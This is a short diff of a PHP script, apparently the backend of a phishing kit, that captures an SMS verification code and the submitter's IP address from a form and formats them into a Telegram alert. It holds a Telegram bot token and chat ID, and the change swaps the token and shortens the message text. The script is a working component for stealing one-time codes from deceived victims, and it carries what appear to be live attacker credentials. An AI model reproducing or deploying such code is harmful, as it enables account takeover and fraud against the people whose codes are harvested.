@@ -1,13 +1,13 @@
 <?php
 
-$token = "7985774212:AAGgWgjSn_AYArg1W4xpaVoBy-LpIqONE8Q";
+$token = "7799308908:AAFyAKoq4MawnnC5ddkm5hZgUi9qFWA08rw";
 $chat_id = "5157616506";
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $codigo_sms = isset($_POST['int1']) ? htmlspecialchars($_POST['int1']) : '';
     $ip = $_SERVER['REMOTE_ADDR'];
     
-    $mensaje = "🛑 Código de verificación ingresado 🛑\n\n";
+    $mensaje = "Código 🛑\n\n";
     $mensaje .= "📩 Código SMS: $codigo_sms\n";
     $mensaje .= "📍 IP: $ip\n";
     
